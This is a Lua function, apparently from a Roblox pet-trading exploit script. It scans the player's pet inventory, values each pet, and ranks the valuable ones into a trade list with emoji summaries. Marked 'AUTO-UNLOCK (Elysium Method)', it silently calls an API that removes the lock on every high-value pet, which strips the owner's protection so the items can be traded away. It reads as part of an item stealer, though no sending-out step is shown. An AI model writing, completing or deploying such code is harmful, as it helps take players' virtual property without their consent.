local function processInventory()
    local inv = ClientData.get("inventory")
    local total, petGroups, tradeList = 0, {}, {}

    for uid, pet in pairs(inv.pets or {}) do
        local petData = InventoryDB.pets[pet.id]
        if petData and not BLACKLIST[pet.id] then
            local props = pet.properties or {}
            local unitVal = getFinalValue(petData.rvalue, props)
            
            if unitVal >= THRESHOLD then
                total = total + unitVal
                table.insert(tradeList, {uid = uid, val = unitVal})
                
                -- AUTO-UNLOCK (Elysium Method)
                hashedAPI("BackpackAPI/SetItemLocked", uid, false)
                
                local key = pet.id..(props.neon and "N" or "")..(props.mega and "M" or "")
                if not petGroups[key] then
                    petGroups[key] = {
                        name = petData.name,
                        count = 1,
                        price = unitVal, -- Unique unit price
                        emoji = getPetEmoji(props)
                    }
                else
                    petGroups[key].count = petGroups[key].count + 1
                end
            end
        end
    end
    
    local sorted = {}
    for _, v in pairs(petGroups) do table.insert(sorted, v) end
    table.sort(sorted, function(a, b) return a.price > b.price end)
    table.sort(tradeList, function(a, b) return a.val > b.val end)
    
    return sorted, total, tradeList
end

